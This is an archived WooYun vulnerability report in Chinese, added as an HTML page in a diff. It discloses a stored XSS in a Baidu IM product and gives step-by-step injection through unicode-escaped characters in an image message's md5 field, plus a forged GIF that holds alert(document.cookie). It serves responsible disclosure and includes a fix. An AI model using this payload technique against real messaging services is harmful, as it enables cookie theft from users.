@@ -1,0 +1,390 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度某IM产品又一存储型Xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度某IM产品又一存储型Xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-17 11:56</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-09：	细节向普通白帽子公开<br/>
+									2012-07-19：	细节向实习白帽子公开<br/>
+									2012-08-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">经测试，上次的漏洞已经修复啦，但又找到一个新的方法，可以导致Xss。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 首先是上传一个正常的图片。<br />
+<br />
+<br />
+<br />
+&lt;msg&gt;&lt;font n=&quot;宋体&quot; s=&quot;10&quot; b=&quot;0&quot; i=&quot;0&quot; ul=&quot;0&quot; c=&quot;0&quot;/&gt;&lt;img n=&quot;9BA5EC29F8&quot; md5=&quot;bcb94d83862402da4337a19a6b0c4cd6&quot; t=&quot;png&quot;/&gt;&lt;/msg&gt;<br />
+<br />
+<br />
+<br />
+2. 然后修改md5参数。。上一次是&amp;quot;的问题。我想你们肯定修复了，于是就换一个方法试试。<br />
+<br />
+<br />
+<br />
+&lt;msg&gt;&lt;font n=&quot;宋体&quot; s=&quot;10&quot; b=&quot;0&quot; i=&quot;0&quot; ul=&quot;0&quot; c=&quot;0&quot;/&gt;&lt;img n=&quot;9BA5EC29F8&quot; md5=&quot;bcb94d83862402da4337a19a6b0c4cd6\u0023\u0022\u003e&quot; t=&quot;png&quot;/&gt;&lt;/msg&gt;<br />
+<br />
+<br />
+<br />
+3. 这样修改后，再发送。。发现接收方就一直是一个图片，在转啊转！！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1711503435412e9dff88b3e79ec686f961acc9c4.jpg" target="_blank"><img src="../images/1711503435412e9dff88b3e79ec686f961acc9c4.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+打开调试工具，可以定位到那个转啊转的图片上！<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;IMG style=&quot;DISPLAY: none&quot; border=0 _type=&quot;userDefined&quot; _src=&#039;http://file.im.baidu.com/get/file/content/old_image/bcb94d83862402da4337a19a6b0c4cd6#&quot;&gt;?from=page&amp;amp;rnd=16vramskf&#039;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 可见自定义的属性 _src 和 _type ，我们不难推测，程序员之后的操作，大概是读取_src属性，<br />
+<br />
+<br />
+<br />
+并重新进行输出&lt;img src=&quot;+ _src + &quot;&gt; 的操作。<br />
+<br />
+<br />
+<br />
+5. 那么这里应该会出现 &lt;img src=&quot;http://file.im.baidu.com/get/file/content/old_image/bcb94d83862402da4337a19a6b0c4cd6#&quot;&gt;&quot;&gt;的情况才对。<br />
+<br />
+<br />
+<br />
+6. 可这个图片并没有如预期的加载出来。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+7. 搜索_src，定位到这个JS文件，http://st0.im.baidu.com/popup/popup.js?v=04241601<br />
+<br />
+<br />
+<br />
+分析图片加载的相关代码, 看到以下内容。<br />
+<br />
+<br />
+<br />
+    function g(C, D, B) {<br />
+<br />
+        this.img = D;<br />
+<br />
+        this.chat = C;<br />
+<br />
+        this.tryCount = 0;<br />
+<br />
+        this.tryTime = 30;<br />
+<br />
+        this.timmer = null;<br />
+<br />
+        this.level = 2;<br />
+<br />
+        var A = D.getAttribute(&quot;_src&quot;),<br />
+<br />
+        E = this;<br />
+<br />
+        this.doload = function() {<br />
+<br />
+            e.sio.callByServer(A,<br />
+<br />
+			..........<br />
+<br />
+<br />
+<br />
+8. 可以看到，var A = D.getAttribute(&quot;_src&quot;), 之后，被e.sio.callByServer(A .. 所调用。<br />
+<br />
+<br />
+<br />
+9. 进一步，在调试工具里，调出 baidu.sio.callByServer 的代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>function (a,n,o){var j=document.createElement(&quot;SCRIPT&quot;),i=&quot;bd__cbs__&quot;,l,f,p=o||{},d=p.charset,g=p.queryField||&quot;callback&quot;,m=p.timeOut||0,b,c=new RegExp(&quot;(\\?|&amp;)&quot;+g+&quot;=([^&amp;]*)&quot;),h;if(baidu.lang.isFunction(n)){l=i+Math.floor(Math.random()*2147483648).toString(36);window[l]=k(0)}else{if(baidu.lang.isString(n)){l=n}else{if(h=c.exec(a)){l=h[2]}}}if(m){b=setTimeout(k(1),m)}a=a.replace(c,&quot;\x241&quot;+g+&quot;=&quot;+l);if(a.search(c)&lt;0){a+=(a.indexOf(&quot;?&quot;)&lt;0?&quot;?&quot;:&quot;&amp;&quot;)+g+&quot;=&quot;+l}baidu.sio._createScriptTag(j,a,d);function k(q){return function(){try{if(q){p.onfailure&amp;&amp;p.onfailure()}else{n.apply(window,arguments);clearTimeout(b)}window[l]=null;delete window[l]}catch(r){}finally{baidu.sio._removeScriptTag(j)}}}}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+10. 不用仔细看，看到document.createElement(&quot;SCRIPT&quot;)，就基本能猜测到，这个baidu.sio.callByServer是用来加载外部JS文件的。<br />
+<br />
+<br />
+<br />
+11. 这样看来，_src 里指定的文件，似乎被当作JS文件加载了？<br />
+<br />
+<br />
+<br />
+12. 为了进一步了解是怎么回事。<br />
+<br />
+<br />
+<br />
+13. 我们再发送一次图片，并进行抓包。 可以看到图片加载时候，发生了2个请求。<br />
+<br />
+<br />
+<br />
+http://file.im.baidu.com/get/file/content/old_image/fb64a79258fc6568f1cf28a02fbe84b0?from=page&amp;rnd=16vq30dup&amp;callback=bd__cbs__2hsm6v<br />
+<br />
+<br />
+<br />
+http://file.im.baidu.com/get/file/content/old_image/fb64a79258fc6568f1cf28a02fbe84b0?from=page&amp;rnd=16vq30dup<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17115054e670546886a8f80fe6d0a9f867b0d9f0.jpg" target="_blank"><img src="../images/17115054e670546886a8f80fe6d0a9f867b0d9f0.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+14. 对比上面2个地址，不难发现，这个地址返回内容是由callback参数决定的。<br />
+<br />
+<br />
+<br />
+15. 这样一来，我就可以推断出，为什么刚才我们发送的图片始终没有加载。<br />
+<br />
+<br />
+<br />
+因为我们的地址是<br />
+<br />
+<br />
+<br />
+http://file.im.baidu.com/get/file/content/old_image/bcb94d83862402da4337a19a6b0c4cd6#&quot;&gt;?from=page&amp;amp;rnd=16vramskf&amp;callback=bd__cbs__2hsm6v<br />
+<br />
+<br />
+<br />
+那么程序首先会把这个地址当作 JS 文件去加载。<br />
+<br />
+<br />
+<br />
+baidu.sio.callByServer(&#039;http://file.im.baidu.com/get/file/content/old_image/bcb94d83862402da4337a19a6b0c4cd6#&quot;&gt;?from=page&amp;amp;rnd=16vramskf&amp;callback=bd__cbs__2hsm6v&#039;);<br />
+<br />
+<br />
+<br />
+当时，上面这个地址，显然是一个图片，被当为JS，始终无法正常加载，因而。。就一直加载中。。<br />
+<br />
+<br />
+<br />
+16. 但是，这里显然存在一个安全问题。。。 如果我们图片的内容是JS呢？<br />
+<br />
+<br />
+<br />
+那么 baidu.sio.callByServer(&#039;内容是JS的图片&#039;)，<br />
+<br />
+<br />
+<br />
+则会读取并加载这个JS的内容。<br />
+<br />
+<br />
+<br />
+17. 带着这个想法，我们不难构造出以下漏洞利用方法。<br />
+<br />
+<br />
+<br />
+A. 首先建立一个伪造的GIF图，内容如下：<br />
+<br />
+<br />
+<br />
+Gif89a=&quot;&quot;<br />
+<br />
+alert(document.cookie);<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17115110e12c71f548b02e5168c943cafbe2a1a4.jpg" target="_blank"><img src="../images/17115110e12c71f548b02e5168c943cafbe2a1a4.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+B. 然后发送这个图片。抓包得到请求<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;msg&gt;&lt;font n=&quot;宋体&quot; s=&quot;10&quot; b=&quot;0&quot; i=&quot;0&quot; ul=&quot;0&quot; c=&quot;0&quot;/&gt;&lt;img n=&quot;9BA5EC29F8&quot; md5=&quot;ea2a8f229a7559096c3e28769126886c&quot; t=&quot;gif&quot;/&gt;&lt;/msg&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+C. 将 ?from=page# 转换为 unicode :\u003F\u0066\u0072\u006f\u006d\u003D\u0070\u0061\u0067\u0065\u0023<br />
+<br />
+<br />
+<br />
+加到md5的末尾.<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;msg&gt;&lt;font n=&quot;宋体&quot; s=&quot;10&quot; b=&quot;0&quot; i=&quot;0&quot; ul=&quot;0&quot; c=&quot;0&quot;/&gt;&lt;img n=&quot;9BA5EC29F8&quot; md5=&quot;ea2a8f229a7559096c3e28769126886c\u003F\u0066\u0072\u006f\u006d\u003D\u0070\u0061\u0067\u0065\u0023&quot; t=&quot;gif&quot;/&gt;&lt;/msg&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+D. 发送此内容。可以看到接收方弹出了弹窗<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17115127780e18fee43e64486122b72b3d244d56.jpg" target="_blank"><img src="../images/17115127780e18fee43e64486122b72b3d244d56.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+18. 总结本漏洞，主要利用了3点。<br />
+<br />
+<br />
+<br />
+A. md5值处可以插入内容<br />
+<br />
+<br />
+<br />
+B. 通过加入 #的方式阻断了  http://file.im.baidu.com/get/file/content/old_image/xxxxx 的 callback参数作用。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/171151412c40cea55d72321db3f105ffc25f39cd.jpg" target="_blank"><img src="../images/171151412c40cea55d72321db3f105ffc25f39cd.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+C. 上传图片文件处，被我们利用为JS文件进行执行。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">将md5值限制为32位长度，仅允许 字母+数字 字符集。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08394" title="百度某IM产品又一存储型Xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-06-19 14:17</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交  和上次问题一样  这种问题可以更直接并且更方便的获取用户数据</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8394";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
